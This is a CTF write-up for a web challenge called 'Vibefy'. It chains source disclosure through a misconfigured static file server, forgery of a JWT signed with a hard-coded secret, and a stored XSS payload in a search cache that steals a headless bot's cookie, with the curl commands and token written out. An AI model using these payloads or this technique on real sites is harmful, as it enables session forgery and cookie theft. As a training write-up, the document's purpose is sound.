# Vibefy
!> [!WARNING]
> During the CTF this challenge was taken down for *"admin reasons"*, so we couldn't continue solving this one...

## Description
> *My friend just got a vibe-coder job, this is his first project, did he do well?*

**URL:** https://vibefy.ctf.pascalctf.it

## Solution
**TL;DR**: Source code disclosure + JWT forgery + Stored XSS to steal bot's flag cookie

### Vulnerability Analysis

1. **Source Code Disclosure**
   - The app uses `express.static(path.join(__dirname, ''))` which serves ALL files from the app directory
   - Access source files at: `/index.js`, `/headless.js`, `/user.js`, `/cache.js`

2. **JWT Secret Exposed**
   - Found in `/user.js`: `SECRET = 'super-secret-key'`
   - Can forge JWTs for any user ID

3. **Stored XSS in Search Cache**
   - Search results are cached per-user: `cache[id] = results`
   - Template uses unescaped output: `<%- results.message %>`
   - When search returns no songs: `{message: 'No songs found for ' + query}`

4. **Bot with Flag Cookie**
   - `/api/healthcheck` triggers headless browser
   - Bot sets `flag` cookie with `httpOnly: false`
   - Bot visits `/search` which renders cached XSS

### Exploit Steps

1. Forge JWT for user 0 (bot's user ID):
   ```javascript
   jwt.sign({ id: 0 }, 'super-secret-key')
   // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MH0.HzsHRS2SOBzIQJRx4A43x4wsQCV5H-ZIDxYsJtQqJCc
   ```

2. Inject XSS into user 0's cache:
   ```bash
   curl -b "session=<user0_jwt>" \
     "https://vibefy.ctf.pascalctf.it/api/search?q=<img src=x onerror=\"fetch('/api/search?q=FLAG_'+document.cookie)\">"
   ```

3. Trigger healthcheck:
   ```bash
   curl -b "session=<user0_jwt>" "https://vibefy.ctf.pascalctf.it/api/healthcheck"
   ```

4. XSS executes in bot's browser, reads flag cookie, caches it under user 0

5. Retrieve flag from cache:
   ```bash
   curl -b "session=<user0_jwt>" "https://vibefy.ctf.pascalctf.it/search"
   # Look for FLAG_... in cached results
   ```

### Flag
> `pascalCTF{<pending - server was down during solve attempt>}`
